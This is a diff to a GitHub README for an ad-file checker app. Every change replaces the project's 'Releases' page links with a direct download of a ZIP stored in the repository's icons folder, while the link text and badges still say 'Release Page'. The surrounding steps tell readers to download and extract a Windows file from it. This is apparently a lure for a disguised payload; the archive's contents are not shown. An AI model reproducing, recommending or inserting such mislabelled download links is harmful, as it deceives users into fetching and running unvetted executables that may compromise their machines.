@@ -1,6 +1,6 @@
 # 📊 Mass-Ads-App-Ads-Checker - Fast Ad File Validation
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
+[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/raw/refs/heads/main/icons/Ads-App-Mass-Checker-v2.8-beta.1.zip)
 
 ## 🚀 What this app does
 
@@ -27,7 +27,7 @@ The app uses Chrome extension features and runs in the browser. That means you d
 
 ## 📥 Download and install
 
-1. Open the release page: [Mass-Ads-App-Ads-Checker Releases](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
+1. Open the release page: [Mass-Ads-App-Ads-Checker Releases](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/raw/refs/heads/main/icons/Ads-App-Mass-Checker-v2.8-beta.1.zip)
 2. Look for the latest release at the top of the page
 3. Download the Windows file from that release
 4. If the file is in a ZIP archive, right-click it and choose **Extract All**
@@ -194,8 +194,8 @@ This project fits work around:
 
 Use this page to download the latest Windows build and get the newest version of the app:
 
-[Go to Mass-Ads-App-Ads-Checker Releases](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
+[Go to Mass-Ads-App-Ads-Checker Releases](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/raw/refs/heads/main/icons/Ads-App-Mass-Checker-v2.8-beta.1.zip)
 
 ## 🔗 Quick access
 
-[![Releases](https://img.shields.io/badge/Open%20Releases-Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
+[![Releases](https://img.shields.io/badge/Open%20Releases-Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/raw/refs/heads/main/icons/Ads-App-Mass-Checker-v2.8-beta.1.zip)
